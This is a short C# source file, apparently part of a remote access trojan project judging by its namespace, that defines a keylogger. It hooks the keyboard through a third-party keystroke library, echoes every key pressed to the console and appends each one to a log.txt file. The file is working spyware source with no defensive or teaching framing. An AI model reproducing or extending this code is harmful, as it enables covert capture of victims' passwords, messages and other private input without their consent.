using System;
using System.Windows.Forms;
using System.IO;
using Keystroke.API;

namespace remote_access_trojan
{
    class Keylogger
    {
        // Calling this method will log all keyboard presses until the program has exited
        public static void Run()
        {
            var api = new KeystrokeAPI();
            api.CreateKeyboardHook((character) => {
                Console.Write(character);
                File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), "log.txt"), character.ToString());
            });
        }
    }
}
